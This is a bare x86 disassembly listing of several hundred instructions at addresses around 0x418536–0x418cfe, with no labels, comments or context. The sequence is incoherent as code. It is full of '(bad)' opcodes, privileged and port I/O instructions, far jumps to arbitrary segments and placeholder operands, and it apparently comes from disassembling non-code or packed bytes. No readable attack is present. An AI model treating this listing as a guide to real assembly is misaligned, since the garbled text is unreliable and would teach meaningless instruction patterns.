  418536:	stos   BYTE PTR es:[edi],al
  418537:	out    0x8d,eax
  418539:	sub    al,0x0
  41853b:	inc    esp
  41853c:	js     0x4184c0
  41853e:	xchg   ecx,eax
  41853f:	ja     0x418539
  418541:	out    0xb9,al
  418543:	fist   DWORD PTR [edx+0x7ad061f6]
  418549:	shr    BYTE PTR [eax],cl
  41854b:	mov    al,0x2
  41854d:	mov    ds:0x2acb4814,al
  418552:	leave  
  418553:	icebp  
  418554:	ficom  WORD PTR [ebx-0x283afbe4]
  41855a:	into   
  41855b:	jmp    0x7bdfc09a
  418560:	xor    bl,BYTE PTR [ebx-0x3b25e245]
  418566:	adc    al,0x14
  418568:	xchg   ebx,eax
  418569:	xchg   esi,eax
  41856a:	addr16 add cl,ah
  41856d:	adc    dl,BYTE PTR [ebx+0x468e75ee]
  418573:	mov    DWORD PTR [edi],edx
  418575:	hlt    
  418576:	sbb    DWORD PTR [ebx+0x5ae836d9],edx
  41857c:	sti    
  41857d:	jmp    0x418505
  41857f:	ins    DWORD PTR es:[edi],dx
  418580:	mov    bh,0x4c
  418582:	out    0xb1,al
  418584:	pop    ebp
  418585:	sbb    ecx,ebx
  418587:	pop    DWORD PTR [eax]
  418589:	es out dx,al
  41858b:	jecxz  0x41851d
  41858d:	aaa    
  41858e:	out    0xe4,eax
  418590:	test   DWORD PTR [ebx+0x6b],edx
  418593:	add    eax,0x2a98de47
  418598:	stos   BYTE PTR es:[edi],al
  418599:	arpl   WORD PTR [ecx],bx
  41859b:	jmp    0xe6bb:0x8c499d5d
  4185a2:	xchg   ebx,eax
  4185a3:	lds    esp,FWORD PTR [eax+0x0]
  4185a6:	and    BYTE PTR [ebp+eiz*8+0x59],cl
  4185aa:	das    
  4185ab:	in     al,dx
  4185ac:	adc    ch,bl
  4185ae:	mov    al,BYTE PTR [esi]
  4185b0:	cli    
  4185b1:	adc    DWORD PTR [ebp-0xcf6f6b9],ebp
  4185b7:	mov    al,0xc1
  4185b9:	sub    BYTE PTR [edi-0x79],0xde
  4185bd:	mov    al,ds:0x3d4c8e21
  4185c2:	(bad)  
  4185c3:	loopne 0x41859f
  4185c5:	aaa    
  4185c6:	rcl    DWORD PTR [ebx+0x60],cl
  4185c9:	xor    al,0x26
  4185cb:	sbb    eax,0x83a4a556
  4185d0:	jp     0x418616
  4185d2:	push   ss
  4185d3:	not    BYTE PTR fs:[ecx+0x3d3da7e]
  4185da:	cld    
  4185db:	add    esi,DWORD PTR ss:[esi-0xf]
  4185df:	push   es
  4185e0:	pusha  
  4185e1:	pushf  
  4185e2:	ret    0x11cd
  4185e5:	adc    ebx,DWORD PTR [edi]
  4185e7:	pop    esp
  4185e8:	stos   DWORD PTR es:[edi],eax
  4185e9:	fiadd  DWORD PTR [edx+0x2b]
  4185ec:	cs (bad) 
  4185ee:	in     eax,0xc0
  4185f0:	scas   eax,DWORD PTR es:[edi]
  4185f1:	inc    esi
  4185f2:	add    DWORD PTR [edx],edx
  4185f4:	aad    0x48
  4185f6:	test   al,0xf1
  4185f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185f9:	sbb    eax,0x2b5b498f
  4185fe:	mov    ch,0x2e
  418600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418601:	xor    al,BYTE PTR [eax+edi*8-0x3]
  418605:	push   eax
  418606:	jge    0x418640
  418608:	lods   al,BYTE PTR ds:[esi]
  418609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41860a:	into   
  41860b:	into   
  41860c:	(bad)  
  41860d:	test   eax,0xedec31d7
  418612:	and    BYTE PTR [edx+eax*2],bh
  418615:	inc    ebx
  418616:	(bad)  
  418617:	arpl   WORD PTR [ecx-0xb],bp
  41861a:	jecxz  0x418612
  41861c:	and    BYTE PTR [ebx],dh
  41861e:	push   esi
  41861f:	mov    cl,al
  418621:	xlat   BYTE PTR ds:[ebx]
  418622:	xchg   esi,eax
  418623:	mov    DWORD PTR [eax-0x37307a46],0x445917f3
  41862d:	mov    ebp,0xcf16963d
  418632:	std    
  418633:	fbstp  TBYTE PTR [ebp-0x781770da]
  418639:	xchg   edx,eax
  41863a:	cmp    eax,0x6f23fea8
  41863f:	fs jge 0x4186b9
  418642:	inc    eax
  418643:	in     eax,dx
  418644:	loope  0x41861d
  418646:	mov    ecx,0x39ecdc83
  41864b:	cmp    DWORD PTR [ebp+0x22],ebx
  41864e:	jnp    0x4185d3
  418650:	inc    ecx
  418651:	push   edi
  418652:	mov    ds:0x59206528,al
  418657:	sub    dl,BYTE PTR [edi+0x1]
  41865a:	sbb    cl,BYTE PTR [edx+0x40ca11d3]
  418660:	sbb    al,0x38
  418662:	mov    ebx,0x1d463f06
  418667:	rep outs dx,DWORD PTR ds:[esi]
  418669:	pop    ds
  41866a:	push   0xe268471a
  41866f:	mov    ds:0xa0417d3c,eax
  418674:	mov    eax,DWORD PTR [edx]
  418676:	jecxz  0x4186c0
  418678:	sbb    eax,0x74881521
  41867d:	mov    WORD PTR [eax+0x2a],?
  418680:	mov    esi,0x6afe9a58
  418685:	aam    0xd4
  418687:	mov    edx,0xa3908626
  41868c:	test   BYTE PTR [ebx],bl
  41868e:	and    eax,0xeac7d1a9
  418693:	or     ebx,DWORD PTR [ecx-0x70263d89]
  418699:	retf   0x8ec5
  41869c:	mov    dl,0x83
  41869e:	or     DWORD PTR [edi+0x58e6544d],ebp
  4186a4:	neg    DWORD PTR [ecx+0x7f44d115]
  4186aa:	and    BYTE PTR [edx+0x4e],0x52
  4186ae:	sub    ecx,DWORD PTR ds:0x30f38a39
  4186b4:	and    ebp,ebx
  4186b6:	mov    ah,al
  4186b8:	scas   al,BYTE PTR es:[edi]
  4186b9:	repnz imul ecx,DWORD PTR [edx+0x6f],0x16
  4186be:	repz pushf 
  4186c0:	(bad)  
  4186c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186c2:	outs   dx,BYTE PTR ds:[esi]
  4186c3:	mov    bh,BYTE PTR [edi+0x7399b114]
  4186c9:	fcom   QWORD PTR [edi]
  4186cb:	ss jmp 0x1342d55c
  4186d1:	sar    DWORD PTR [esp+esi*2-0x37],cl
  4186d5:	jmp    DWORD PTR [eax+0x3b]
  4186d8:	and    eax,0xb3650c50
  4186dd:	jmp    0x418694
  4186df:	mov    WORD PTR [ebx*2+0x1378f361],fs
  4186e6:	add    ebp,edx
  4186e8:	loop   0x418696
  4186ea:	adc    DWORD PTR [edi+0x830692f],esi
  4186f0:	popf   
  4186f1:	das    
  4186f2:	and    BYTE PTR [edi+edx*8-0x41],bl
  4186f6:	ss fsubrp st(1),st
  4186f9:	ins    BYTE PTR es:[edi],dx
  4186fa:	loop   0x418777
  4186fc:	fcmovu st,st(7)
  4186fe:	and    BYTE PTR [ecx+0x34],ah
  418701:	std    
  418702:	jecxz  0x41876e
  418704:	scas   al,BYTE PTR es:[edi]
  418705:	pusha  
  418706:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418707:	sbb    al,0xf9
  418709:	adc    DWORD PTR [eax+0x3c54c41f],eax
  41870f:	fisub  DWORD PTR [edi+ebp*1+0x78]
  418713:	xchg   edx,eax
  418714:	push   ss
  418715:	aad    0xc
  418717:	ja     0x41873c
  418719:	into   
  41871a:	pushf  
  41871b:	xchg   BYTE PTR [edx-0x4c],ch
  41871e:	ds data16 scas al,BYTE PTR es:[edi]
  418721:	mov    ecx,0x2fdbfb86
  418726:	push   esi
  418727:	xchg   edx,eax
  418728:	lahf   
  418729:	repnz add eax,0x5e8bcbed
  41872f:	inc    edi
  418730:	or     BYTE PTR [ecx*4+0x42577512],ch
  418737:	pop    esp
  418738:	js     0x4186dc
  41873a:	in     eax,0xeb
  41873c:	(bad)  
  41873d:	jl     0x41876f
  41873f:	dec    eax
  418740:	dec    ecx
  418741:	aad    0x6f
  418743:	aas    
  418744:	and    ecx,ecx
  418746:	jmp    0x368:0x8059fd53
  41874d:	mov    esi,DWORD PTR [esi]
  41874f:	neg    esi
  418751:	adc    DWORD PTR [esi+0xcd10af1],ebp
  418757:	pop    ss
  418758:	push   esi
  418759:	scas   eax,DWORD PTR es:[edi]
  41875a:	ret    0x506d
  41875d:	lahf   
  41875e:	mov    ebp,0x80fa6f86
  418763:	jo     0x41870e
  418765:	sbb    DWORD PTR [eax],ebp
  418767:	arpl   di,di
  418769:	ins    BYTE PTR es:[edi],dx
  41876a:	add    eax,0xf5cf401f
  41876f:	(bad)  
  418770:	push   edx
  418771:	leave  
  418772:	test   al,0xfd
  418774:	sbb    cl,BYTE PTR [edx+eax*8]
  418777:	mov    esi,0x8ba2aca2
  41877c:	jmp    0xcfd1:0xfc6ac478
  418783:	jno    0x4187e9
  418785:	das    
  418786:	sbb    ah,ch
  418788:	sbb    al,0x4c
  41878a:	pop    ds
  41878b:	js     0x418807
  41878d:	int3   
  41878e:	sar    DWORD PTR [edi+0x30cb81d2],1
  418794:	mov    al,ds:0x8f70fde2
  418799:	(bad)  
  41879a:	out    dx,al
  41879b:	push   cs
  41879c:	dec    ecx
  41879d:	add    BYTE PTR [ebx],0xbd
  4187a0:	xchg   BYTE PTR [ecx],bl
  4187a2:	inc    ebp
  4187a3:	jmp    0x41880f
  4187a5:	sbb    BYTE PTR [ecx],al
  4187a7:	xchg   ebp,edx
  4187a9:	das    
  4187aa:	mov    edi,0x75b63026
  4187af:	adc    al,0x78
  4187b1:	outs   dx,BYTE PTR ds:[esi]
  4187b2:	dec    eax
  4187b3:	mov    eax,0x62e490f8
  4187b8:	jnp    0x4187de
  4187ba:	scas   eax,DWORD PTR es:[edi]
  4187bb:	rcl    al,1
  4187bd:	lea    edx,[ebx-0x7a6fae54]
  4187c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187c4:	push   ebp
  4187c5:	xchg   cl,ah
  4187c7:	pop    eax
  4187c8:	enter  0x69cf,0xd7
  4187cc:	inc    ebp
  4187cd:	int3   
  4187ce:	gs (bad) 
  4187d0:	inc    eax
  4187d1:	xchg   edi,eax
  4187d2:	shr    BYTE PTR [esi],1
  4187d4:	and    al,0x6f
  4187d6:	dec    esi
  4187d7:	mov    ebx,0x8cb4e5ed
  4187dc:	stc    
  4187dd:	xchg   ebp,eax
  4187de:	loopne 0x418807
  4187e0:	fimul  DWORD PTR [edx+0x8]
  4187e3:	pushf  
  4187e4:	cmp    cl,ah
  4187e6:	or     eax,0x1caf730b
  4187eb:	xor    esp,edi
  4187ed:	or     BYTE PTR [esi+0x2e29c989],bh
  4187f3:	jp     0x4187ba
  4187f5:	pop    es
  4187f6:	push   es
  4187f7:	or     ebx,DWORD PTR [eax-0x35]
  4187fa:	arpl   WORD PTR [esi],bx
  4187fc:	icebp  
  4187fd:	dec    esi
  4187fe:	mov    eax,0x4d5e2c22
  418803:	fcmovbe st,st(3)
  418805:	repz dec esi
  418807:	jmp    0x5f67:0xaaf42e64
  41880e:	dec    edi
  41880f:	(bad)  [esp+ebp*4+0x1c1da0f6]
  418816:	outs   dx,DWORD PTR ds:[esi]
  418817:	add    BYTE PTR [edi+eiz*8+0x67ca7b57],al
  41881e:	sti    
  41881f:	ins    DWORD PTR es:[edi],dx
  418820:	out    dx,al
  418821:	test   DWORD PTR [ebx],eax
  418823:	dec    edi
  418824:	repz dec ebx
  418826:	xchg   ebx,eax
  418827:	in     al,dx
  418828:	shl    BYTE PTR [eax+0x8],cl
  41882b:	outs   dx,DWORD PTR ds:[esi]
  41882c:	jle    0x418808
  41882e:	pop    edx
  41882f:	gs icebp 
  418831:	test   eax,0x3fc03d7b
  418836:	pop    ebp
  418837:	sbb    bh,BYTE PTR [ecx*2+0xba62da5]
  41883e:	cmp    DWORD PTR [ecx-0x4b],esi
  418841:	shl    dh,1
  418843:	sub    al,0xc2
  418845:	fmul   QWORD PTR [ebx-0x4581bb14]
  41884b:	sahf   
  41884c:	sahf   
  41884d:	sub    eax,0xb06718c7
  418852:	push   esp
  418853:	dec    esi
  418854:	stc    
  418855:	addr16 mov gs,ecx
  418858:	cmp    eax,0x998581a8
  41885d:	out    dx,al
  41885e:	and    edx,edi
  418860:	mov    ah,0x46
  418862:	jne    0x4188bd
  418864:	xchg   ecx,eax
  418865:	sbb    eax,0x151a903b
  41886a:	mov    dl,0x2f
  41886c:	mov    al,ds:0x17b51844
  418871:	imul   ebx,DWORD PTR ds:0x1c9feba3,0xffffffe7
  418878:	xor    bh,bl
  41887a:	mov    edx,0xb09aaae0
  41887f:	mov    esp,0x8de08f90
  418884:	xchg   esi,eax
  418885:	in     al,dx
  418886:	fbstp  TBYTE PTR [edi+0x7d85ed00]
  41888c:	loop   0x41885a
  41888e:	mov    dh,0xdd
  418890:	fdiv   DWORD PTR [edi]
  418892:	and    esi,DWORD PTR ss:[ebx]
  418895:	dec    esi
  418896:	dec    ebp
  418897:	in     eax,dx
  418898:	mov    al,BYTE PTR [edi-0x74145963]
  41889e:	les    ebp,FWORD PTR [eax+edi*4]
  4188a1:	ret    
  4188a2:	dec    ecx
  4188a3:	sti    
  4188a4:	adc    DWORD PTR [ebx-0x47af56c4],0x72
  4188ab:	mov    ds:0x6d88f09a,eax
  4188b0:	pop    ecx
  4188b1:	int    0x77
  4188b3:	inc    esi
  4188b4:	jecxz  0x4188cc
  4188b6:	jo     0x418839
  4188b8:	ret    0x5c5f
  4188bb:	(bad)
  4188c0:	call   0xb4d6da4f
  4188c5:	outs   dx,DWORD PTR ds:[esi]
  4188c6:	add    eax,0x3ebc89b2
  4188cb:	cmp    BYTE PTR [esi],0x92
  4188ce:	mov    esi,0xd2eaf14f
  4188d3:	add    DWORD PTR [eax+ebx*1+0x59],ecx
  4188d7:	inc    ebp
  4188d8:	sub    BYTE PTR [edi-0xd],ch
  4188db:	retf   
  4188dc:	or     al,0x38
  4188de:	lds    ebp,FWORD PTR [esp+ecx*4+0x4e]
  4188e2:	lds    ebp,FWORD PTR [esi+0x67]
  4188e5:	push   ss
  4188e6:	pop    es
  4188e7:	call   0xe892efb9
  4188ec:	adc    al,0x37
  4188ee:	push   edi
  4188ef:	sub    dh,bh
  4188f1:	jb     0x41890c
  4188f3:	arpl   WORD PTR [esi+esi*1],si
  4188f6:	dec    esp
  4188f7:	jno    0x418929
  4188f9:	aad    0x46
  4188fb:	into   
  4188fc:	mov    BYTE PTR [edx-0x33],dh
  4188ff:	dec    eax
  418900:	xchg   DWORD PTR ds:0x287528db,edx
  418906:	jmp    0x9420:0xa2a11481
  41890d:	or     edi,DWORD PTR [eax-0x22]
  418910:	bound  ecx,QWORD PTR [esi-0x56871715]
  418916:	xchg   esi,eax
  418917:	mov    cl,0x50
  418919:	mov    al,0xb8
  41891b:	sub    BYTE PTR [eax+eiz*4+0x3],dh
  41891f:	xchg   BYTE PTR [edx],ah
  418921:	stos   DWORD PTR es:[edi],eax
  418922:	push   0xffffffec
  418924:	fnstenv [esi]
  418926:	pop    esi
  418927:	div    DWORD PTR ds:0xf2f132d0
  41892d:	(bad)  
  41892e:	jbe    0x4188fa
  418930:	inc    ebp
  418931:	push   ss
  418932:	jmp    0x8a00:0x8e7b7e8f
  418939:	add    eax,0xde52ba40
  41893e:	stos   DWORD PTR es:[edi],eax
  41893f:	scas   eax,DWORD PTR es:[edi]
  418940:	add    DWORD PTR [eax-0x41],esi
  418943:	popf   
  418944:	arpl   WORD PTR [esi-0x5b4a3141],cx
  41894a:	mov    al,0x37
  41894c:	in     eax,dx
  41894d:	jecxz  0x418955
  41894f:	imul   ebx,DWORD PTR [ebp+0x2fa8093],0x1e7d33c7
  418959:	std    
  41895a:	push   esi
  41895b:	mov    bh,0x4d
  41895d:	adc    DWORD PTR ds:[eax],esi
  418960:	and    al,0x6
  418962:	jbe    0x418943
  418964:	test   DWORD PTR [ebp+0x49],edx
  418967:	jp     0x4188ff
  418969:	or     eax,0xa77faa8a
  41896e:	cmp    edx,DWORD PTR [eax]
  418970:	int    0x49
  418972:	sub    al,0x73
  418974:	(bad)  [edx-0x79287ac9]
  41897a:	pop    ebp
  41897b:	push   ss
  41897c:	ret    0x3b75
  41897f:	jae    0x418907
  418981:	pop    ecx
  418982:	jae    0x41895d
  418984:	pop    ecx
  418985:	add    BYTE PTR [eax+0x7f4a877e],ch
  41898b:	addr16 das 
  41898d:	not    BYTE PTR [ebx+0x41d2738e]
  418993:	inc    edi
  418994:	js     0x4189bf
  418996:	(bad)  
  418997:	and    al,0x99
  418999:	fwait
  41899a:	mov    dh,0x6f
  41899c:	or     edx,esi
  41899e:	scas   al,BYTE PTR es:[edi]
  41899f:	push   esp
  4189a0:	(bad)  
  4189a1:	sub    DWORD PTR [ebx-0x4],esi
  4189a4:	(bad)
  4189a8:	mov    edx,0xd1403043
  4189ad:	sub    DWORD PTR [esi+0x5a],ebx
  4189b0:	add    ah,BYTE PTR [ecx+0x7f]
  4189b3:	dec    edx
  4189b4:	popf   
  4189b5:	jmp    0x3df67100
  4189ba:	popf   
  4189bb:	adc    al,BYTE PTR [esi+ebx*8+0x54]
  4189bf:	xchg   ebp,eax
  4189c0:	inc    eax
  4189c1:	enter  0xc11b,0x3b
  4189c5:	xchg   DWORD PTR [esp+ecx*2-0x28c3355b],ebp
  4189cc:	push   0xffffff9a
  4189ce:	(bad)  
  4189d0:	sar    DWORD PTR [edi+0x304dad94],1
  4189d6:	add    al,0x63
  4189d8:	jle    0x4189a8
  4189da:	rcl    dh,cl
  4189dc:	lea    ebx,[edi]
  4189de:	mov    ds:0x52cf49ad,eax
  4189e3:	adc    BYTE PTR [ecx-0x7916a244],bl
  4189e9:	nop
  4189ea:	loopne 0x418973
  4189ec:	pop    edx
  4189ed:	xchg   esi,edi
  4189ef:	pushf  
  4189f0:	sub    BYTE PTR [ebx+0x46bf24eb],cl
  4189f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189f7:	icebp  
  4189f8:	cmp    BYTE PTR [ecx+0x9],dh
  4189fb:	repz into 
  4189fd:	jg     0x418a58
  4189ff:	mov    ds:0x4febf6b5,eax
  418a04:	cmp    cl,BYTE PTR [edi]
  418a06:	or     ch,BYTE PTR [esp+esi*1+0x76c8631a]
  418a0d:	test   DWORD PTR ds:[ebp-0x31981012],edx
  418a14:	add    dh,al
  418a16:	dec    edi
  418a17:	pusha  
  418a18:	out    dx,al
  418a19:	sub    DWORD PTR [ebx],ebx
  418a1b:	cli    
  418a1c:	pusha  
  418a1d:	outs   dx,BYTE PTR ds:[esi]
  418a1e:	push   0x1c9e19ec
  418a23:	ins    BYTE PTR es:[edi],dx
  418a24:	add    DWORD PTR [ecx],ecx
  418a26:	aas    
  418a27:	mov    dl,0xd6
  418a29:	push   0xffffffa3
  418a2b:	loopne 0x418a2e
  418a2d:	mov    ds:0xbbbff68a,eax
  418a32:	into   
  418a33:	push   esp
  418a34:	rcl    BYTE PTR [edi-0x1],cl
  418a37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a38:	js     0x4189f4
  418a3a:	popf   
  418a3b:	into   
  418a3c:	call   0x2b7eb253
  418a41:	mov    al,ds:0x25fcf96a
  418a46:	(bad)  
  418a47:	xlat   BYTE PTR ds:[ebx]
  418a48:	call   0x4d29:0x6ba73b16
  418a4f:	cmp    ebp,DWORD PTR [ebp-0x60b90669]
  418a55:	fist   WORD PTR [eax+0x6]
  418a58:	mov    ?,WORD PTR [esi+0x34]
  418a5b:	ret    
  418a5c:	xor    DWORD PTR [edx],eax
  418a5e:	leave  
  418a5f:	inc    esi
  418a60:	inc    eax
  418a61:	mov    dl,0x11
  418a63:	nop
  418a64:	cld    
  418a65:	or     ebx,DWORD PTR [esi+0x215b541f]
  418a6b:	lahf   
  418a6c:	rcr    bl,cl
  418a6e:	sub    eax,0x35403a9f
  418a74:	fsub   st,st(2)
  418a76:	stc    
  418a77:	out    0x8f,al
  418a79:	lock adc DWORD PTR [ebx+0x39],edx
  418a7d:	(bad)  
  418a7e:	mov    cl,0x9a
  418a80:	xor    cl,BYTE PTR ds:0x2209cedf
  418a86:	dec    ecx
  418a87:	adc    eax,0x6f122a15
  418a8c:	push   esi
  418a8d:	xor    DWORD PTR [ecx+0x60],ebp
  418a90:	and    edx,ebp
  418a92:	(bad)
  418a96:	aaa    
  418a97:	or     DWORD PTR [edi+esi*1-0x7f7f35b7],ebp
  418a9e:	sub    al,0x2e
  418aa0:	jg     0x418a70
  418aa2:	cmc    
  418aa3:	jnp    0x418ae6
  418aa5:	ret    
  418aa6:	adc    eax,0xbcd81ecc
  418aab:	out    0xe,al
  418aad:	call   0xbad3:0xa395d2a5
  418ab4:	repnz outs dx,DWORD PTR ds:[esi]
  418ab6:	je     0x418ab1
  418ab8:	cwde   
  418ab9:	cmp    eax,esp
  418abb:	ss cmp dl,ch
  418abe:	jmp    0xcc16:0x94b4318
  418ac5:	jo     0x418aa9
  418ac7:	jne    0x418b2f
  418ac9:	xchg   BYTE PTR [edx],cl
  418acb:	mov    ch,0x4e
  418acd:	cmp    cl,BYTE PTR [esi+0x635aade7]
  418ad3:	inc    esp
  418ad4:	sbb    bh,ch
  418ad6:	mov    ch,0x65
  418ad8:	(bad)  
  418ad9:	ss sti 
  418adb:	sar    edx,cl
  418add:	daa    
  418ade:	push   edx
  418adf:	inc    edi
  418ae0:	aaa    
  418ae1:	pop    ebp
  418ae2:	mov    ch,0x37
  418ae4:	dec    eax
  418ae5:	dec    ebp
  418ae6:	enter  0xa4b,0x9d
  418aea:	mov    edx,0x4c724b2a
  418aef:	mov    bh,0x5f
  418af1:	nop
  418af2:	je     0x418a93
  418af4:	setl   ah
  418af7:	and    al,0x59
  418af9:	push   0x26c3ae41
  418afe:	jno    0x418b21
  418b00:	leave  
  418b01:	push   esi
  418b02:	sbb    BYTE PTR [eax+ecx*4],cl
  418b05:	ss adc cl,ch
  418b08:	(bad)  
  418b09:	mov    ecx,0x8a565247
  418b0e:	pusha  
  418b0f:	mov    eax,ds:0xf724247a
  418b14:	dec    esp
  418b15:	pop    esi
  418b16:	scas   eax,DWORD PTR es:[edi]
  418b17:	xchg   ebp,eax
  418b18:	add    eax,0x93b09e5a
  418b1d:	cs pop ebp
  418b1f:	(bad)  
  418b20:	lods   al,BYTE PTR ds:[esi]
  418b21:	repz mov esp,0x5215e393
  418b27:	repz adc BYTE PTR [ebx-0x24],0x37
  418b2c:	cmp    al,0x37
  418b2e:	add    BYTE PTR [esi+0x48],ch
  418b31:	sbb    BYTE PTR [edi+0x7fe04bf9],ch
  418b37:	into   
  418b38:	(bad)  
  418b39:	mov    ah,0x51
  418b3b:	sbb    eax,0xa3a263f8
  418b40:	adc    edx,DWORD PTR ds:[eax+0x1a]
  418b44:	std    
  418b45:	sub    al,0xeb
  418b47:	adc    eax,0x8095a9fd
  418b4c:	aas    
  418b4d:	cld    
  418b4e:	scas   al,BYTE PTR es:[edi]
  418b4f:	inc    esi
  418b50:	outs   dx,DWORD PTR ds:[esi]
  418b51:	jbe    0x418b60
  418b53:	gs xchg esi,eax
  418b55:	pop    esp
  418b56:	sub    edx,DWORD PTR [ecx+0x4b]
  418b59:	xchg   esi,eax
  418b5a:	inc    esp
  418b5b:	jae    0x418b27
  418b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b5e:	(bad)  [edx-0x13d780a3]
  418b64:	xor    edx,DWORD PTR [eax]
  418b66:	xchg   dh,dh
  418b68:	dec    ebp
  418b69:	(bad)  
  418b6a:	(bad)  
  418b6b:	stos   BYTE PTR es:[edi],al
  418b6c:	pop    esp
  418b6d:	mov    ah,0x2f
  418b6f:	xchg   esi,eax
  418b70:	mov    ds:0xfa960,al
  418b75:	pop    es
  418b76:	cmp    eax,0x4490a8b5
  418b7b:	(bad)  
  418b7c:	add    al,0x31
  418b7e:	out    dx,al
  418b7f:	xor    eax,0xa3f21a18
  418b85:	push   esi
  418b86:	fidiv  DWORD PTR [eax+ebp*1+0x60]
  418b8a:	cmp    al,0x69
  418b8c:	daa    
  418b8d:	cmp    al,0x2f
  418b8f:	shr    BYTE PTR [ebx+0x4d665d48],cl
  418b95:	imul   edi,ecx,0x10ce2dd7
  418b9b:	nop
  418b9c:	rcr    ebx,cl
  418b9e:	xchg   edx,eax
  418b9f:	(bad)  
  418ba0:	fst    QWORD PTR [edi+0x45]
  418ba3:	dec    esp
  418ba4:	sbb    ah,ch
  418ba6:	adc    ecx,DWORD PTR [edx+0x7f]
  418ba9:	dec    ebx
  418baa:	adc    BYTE PTR ds:0xd942339a,ah
  418bb0:	adc    ebx,esp
  418bb2:	repz jle 0x418bbd
  418bb5:	nop
  418bb6:	ficom  DWORD PTR [esi]
  418bb8:	add    DWORD PTR [edi-0x78],ebp
  418bbb:	fistp  QWORD PTR [esp+edx*8]
  418bbe:	xchg   esi,eax
  418bbf:	jno    0x418bd2
  418bc1:	xchg   esp,eax
  418bc2:	xchg   BYTE PTR ds:0x5ca5b784,dh
  418bc8:	in     al,0x47
  418bca:	adc    esi,edi
  418bcc:	cwde   
  418bcd:	dec    ebp
  418bce:	(bad)  
  418bcf:	(bad)  
  418bd0:	fucomip st,st(5)
  418bd2:	clc    
  418bd3:	cdq    
  418bd4:	aas    
  418bd5:	dec    edx
  418bd6:	xchg   esi,edx
  418bd8:	mov    edx,0x812e5b5d
  418bdd:	loop   0x418b89
  418bdf:	jns    0x418c22
  418be1:	ret    0xb805
  418be4:	sbb    al,0x3b
  418be6:	mov    bh,0xd4
  418be8:	mov    edi,0x788af348
  418bed:	fdiv   QWORD PTR [ecx]
  418bef:	adc    bl,bh
  418bf1:	leave  
  418bf2:	push   0x57ac1062
  418bf7:	ss dec ebp
  418bf9:	fisub  WORD PTR [edx]
  418bfb:	xchg   bh,dl
  418bfd:	xor    BYTE PTR [edi+eiz*4-0x2a9e92d6],dl
  418c04:	je     0x418be8
  418c06:	add    eax,0xb3af2c46
  418c0b:	mov    bh,0xe6
  418c0d:	push   0x37
  418c0f:	mov    ah,0x81
  418c11:	fst    QWORD PTR ds:0x81f06514
  418c17:	mov    ecx,0xc90040e8
  418c1c:	push   eax
  418c1d:	push   eax
  418c1e:	out    0x60,al
  418c20:	dec    edi
  418c21:	push   edi
  418c22:	jl     0x418c31
  418c24:	push   ebx
  418c25:	jne    0x418c29
  418c27:	inc    esi
  418c28:	sbb    BYTE PTR [ebx-0x6567bdf3],bl
  418c2e:	and    eax,0x7f80fbf
  418c33:	mov    ah,0xb2
  418c35:	dec    esp
  418c36:	aam    0x0
  418c38:	cmp    bh,BYTE PTR [esp+edx*8+0x17]
  418c3c:	adc    al,0x51
  418c3e:	inc    ecx
  418c3f:	clc    
  418c40:	mov    eax,0xb543ce1
  418c45:	dec    DWORD PTR [edi+ecx*1+0x7cf8ef1b]
  418c4c:	mov    al,0xdb
  418c4e:	dec    edx
  418c4f:	and    eax,0x1ea96e8b
  418c54:	lods   eax,DWORD PTR ds:[esi]
  418c55:	mov    edi,0x7003cc80
  418c5a:	data16 and al,0xc0
  418c5d:	adc    cl,BYTE PTR [eax+ebx*1]
  418c60:	push   ss
  418c61:	bnd je 0x418c9a
  418c64:	push   edx
  418c65:	out    dx,eax
  418c66:	and    al,0xac
  418c68:	jle    0x418c41
  418c6a:	dec    edx
  418c6b:	xchg   edi,eax
  418c6c:	jl     0x418cda
  418c6e:	pop    es
  418c6f:	inc    ecx
  418c70:	dec    ebp
  418c71:	xlat   BYTE PTR ds:[bx]
  418c73:	jmp    0x418c94
  418c75:	push   esp
  418c76:	xchg   DWORD PTR [ebx],esp
  418c78:	xchg   ebx,eax
  418c79:	xor    dl,bh
  418c7b:	retf   
  418c7c:	test   BYTE PTR [ebx],ch
  418c7e:	cmc    
  418c7f:	fnstenv es:[edx+edx*2+0x35]
  418c84:	test   eax,0x22f522f7
  418c89:	push   es
  418c8a:	sbb    dh,BYTE PTR [edx]
  418c8c:	cli    
  418c8d:	push   ss
  418c8e:	dec    ebx
  418c8f:	(bad)  
  418c90:	cli    
  418c91:	mov    ebp,0x968b1277
  418c96:	int    0x98
  418c98:	jecxz  0x418cbb
  418c9a:	push   ecx
  418c9b:	dec    ecx
  418c9c:	enter  0xdc2d,0x24
  418ca0:	loope  0x418cbc
  418ca2:	aam    0xd
  418ca4:	es pusha 
  418ca6:	xchg   ebx,eax
  418ca7:	mov    ch,0xa3
  418ca9:	lods   eax,DWORD PTR ds:[esi]
  418caa:	(bad)  
  418cab:	scas   al,BYTE PTR es:[edi]
  418cac:	dec    esp
  418cad:	pop    esi
  418cae:	daa    
  418caf:	shl    BYTE PTR [edx+0x23432cbf],1
  418cb5:	(bad)  
  418cb6:	mov    sp,0xb081
  418cba:	pop    ebx
  418cbb:	repz sub BYTE PTR [eax+eiz*1],0x2d
  418cc0:	mov    ds:0xd68325c6,eax
  418cc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cc6:	rcl    BYTE PTR [ecx-0x5d4a329f],0x49
  418ccd:	jmp    0xd48785f5
  418cd2:	xchg   BYTE PTR [esi+0x61],bl
  418cd5:	test   BYTE PTR [ecx+ebp*2],dl
  418cd8:	sub    al,0xb
  418cda:	lock fs push es
  418cdd:	xor    esi,DWORD PTR [ecx]
  418cdf:	iret   
  418ce0:	push   ebx
  418ce1:	add    BYTE PTR [ecx],0xce
  418ce4:	retf   0x8578
  418ce7:	(bad)  
  418ce8:	loopne 0x418cf8
  418cea:	adc    ebp,esp
  418cec:	mov    al,ds:0x6eec2ea0
  418cf1:	ins    DWORD PTR es:[edi],dx
  418cf2:	mov    eax,ds:0x9611d953
  418cf7:	loopne 0x418d14
  418cf9:	add    eax,esi
  418cfb:	mov    bh,0x52
  418cfd:	stos   DWORD PTR es:[edi],eax
  418cfe:	sub    DWORD PTR [edx-0x7e],0xd427c59c
